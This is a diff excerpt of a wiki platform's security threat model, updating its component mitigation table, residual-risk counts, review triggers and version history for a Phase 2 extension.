-| AU-12 | Audit Record Generation | R-01-R-05 | D1 audit logs |
-| CM-2 | Baseline Configuration | T-09 | Reproducible builds |
-| CM-3 | Configuration Change Control | T-06, T-09 | Git + branch protection |
-| CM-6 | Configuration Settings | D-01, S-06 | Security headers |
-| CM-7 | Least Functionality | T-08, T-09 | Minimal attack surface |
-| CM-11 | User-Installed Software | T-08 | File upload validation |
-| IA-2 | Identification and Authentication | S-01-S-04, E-07 | OAuth + JWT |
-| IA-4 | Identifier Management | S-04 | UUID generation |
-| IA-5 | Authenticator Management | S-01 | JWT signing |
-| IA-8 | Non-Org User Authentication | S-03, S-04, E-07 | OAuth validation |
-| IR-4 | Incident Handling | All | Incident response plan |
-| IR-5 | Incident Monitoring | All | Logging + alerting |
-| IR-6 | Incident Reporting | All | Communication templates |
-| RA-3 | Risk Assessment | All | This threat model |
-| RA-5 | Vulnerability Monitoring | T-09 | npm audit, Snyk |
-| SA-4 | Acquisition Process | T-09 | Dependency review |
-| SA-8 | Security Engineering | All | Security-by-design |
-| SA-11 | Developer Testing | All | Security test plan |
-| SC-5 | Denial of Service Protection | D-01-D-06 | Rate limiting, WAF |
-| SC-6 | Resource Availability | D-05 | Storage quotas |
-| SC-7 | Boundary Protection | S-06, S-07, D-01 | Cloudflare WAF |
-| SC-8 | Transmission Confidentiality | S-02, I-03, I-08 | TLS 1.2+ |
-| SC-12 | Cryptographic Key Management | S-01 | JWT key rotation |
-| SC-13 | Cryptographic Protection | I-08 | TLS, WSS |
-| SC-20 | Secure DNS | S-06 | DNSSEC |
-| SC-23 | Session Authenticity | S-03, T-04 | CSRF tokens |
-| SC-28 | Protection of Information at Rest | All | Cloudflare encryption |
-| SI-2 | Flaw Remediation | T-09 | Patch management |
-| SI-3 | Malicious Code Protection | T-08 | File scanning |
-| SI-4 | System Monitoring | D-01-D-06 | Usage monitoring |
-| SI-10 | Information Input Validation | T-01-T-05, E-01 | Input validation |
-| SI-11 | Error Handling | All | Error sanitization |
-| SI-15 | Information Management | T-01, T-02 | Content sanitization |
+| Component | Primary Mitigation | Secondary Mitigation | Threat IDs |
+|-----------|-------------------|---------------------|------------|
+| Command Palette | Input sanitization, command whitelist | CSP nonce blocking | T-03, D-07 |
+| Keyboard Shortcuts | Focus trap management, input context detection | Browser extension conflict detection | Low |
+| Graph View | Node/edge count caps, build-time data | Canvas sandbox | D-08, I-06 |
+| LaTeX Renderer | Expression length limit, render timeout | SSR-first, Worker fallback | D-09, T-10 |
+| Regex Search | 4-layer ReDoS defense, complexity analysis | Execution timeout, Web Worker | D-07 |
+| Comments | DOMPurify, JWT authorship, CSRF tokens | SpamGuard rate limiting | T-02, S-09, R-07 |
+| Annotations | DOMPurify, W3C structured body, XPath validation | Server-side author derivation | T-02, S-08, R-07 |
+| User Accounts | OAuth 2.0, JWT, RBAC, MFA for admin | Session management, token rotation | S-01-S-05, E-01, E-02, E-07 |
+| MDX Editor | MDX whitelist, DOMPurify, sandboxed preview | CSRF on save, Yjs CRDT | T-10, T-01, T-06 |
+| Plugin API | Web Worker sandbox, capability matrix, static analysis | Resource limits, signed bundles | T-11, E-08, I-09, D-10, R-06 |
+| Theme Engine | Zod schema validation, CSS custom properties only | CSP style-src, automated CSS analysis | T-12, I-10, E-09 |
+| Settings Manager | Dual validation, __proto__ rejection, schema versioning | Server-only field protection | T-13, E-10, I-11 |
 
 ---
 
@@ -1164,11 +1494,11 @@ After implementing all P0 and P1 mitigations:
 
 | Risk Level | Pre-Mitigation | Post-Mitigation | Change |
 |------------|---------------|-----------------|--------|
-| Critical | 6 | 0 | -6 |
-| High | 16 | 2 | -14 |
-| Medium | 14 | 10 | -4 |
-| Low | 6 | 12 | +6 |
-| **Total** | **42** | **24** | **-18** |
+| Critical | 7 | 0 | -7 |
+| High | 24 | 3 | -21 |
+| Medium | 21 | 14 | -7 |
+| Low | 7 | 15 | +8 |
+| **Total** | **61** | **32** | **-29** |
 
 ### 14.2 Accepted Residual Risks
 
@@ -1184,6 +1514,11 @@ After implementing all P0 and P1 mitigations:
 | I-05 | Medium | Log sanitization reduces risk; Cloudflare log access controlled |
 | I-06 | Medium | Search information leakage is low-sensitivity |
 | I-08 | Medium | WebSocket interception mitigated by WSS; low attack surface |
+| D-08 | Medium | Graph view capped at 500 nodes; build-time data only |
+| D-09 | Medium | LaTeX rendering timeout enforced; SSR-first |
+| I-10 | Medium | Theme CSS restricted to custom properties; CSP mitigates |
+| I-11 | Medium | Settings export excludes sensitive fields by schema design |
+| R-06 | Medium | Plugin lifecycle logging is best practice |
 
 ---
 
@@ -1199,12 +1534,15 @@ After implementing all P0 and P1 mitigations:
 | Security incident | Review and update relevant threats | Security Team |
 | Quarterly review | Full threat model review | Security Team |
 | Pre-launch | Complete threat model audit | Security Team + External |
+| New plugin published | Review plugin capabilities and sandbox | Security Team |
+| Theme marketplace update | Review theme CSS validation | Security Team |
 
 ### 15.2 Version History
 
 | Version | Date | Author | Changes |
 |---------|------|--------|---------|
 | 1.0.0 | 2026-06-07 | Wikisites Security Team | Initial threat model |
+| 2.0.0 | 2026-06-19 | Wikisites Security Team | Extended for Phase 2 components: Command Palette, Keyboard Shortcuts, Graph View, LaTeX Renderer, Regex Search, Comments, Annotations, User Accounts, MDX Editor, Plugin API, Theme Engine, Settings Manager; 19 new threats added |
 
 ---
 
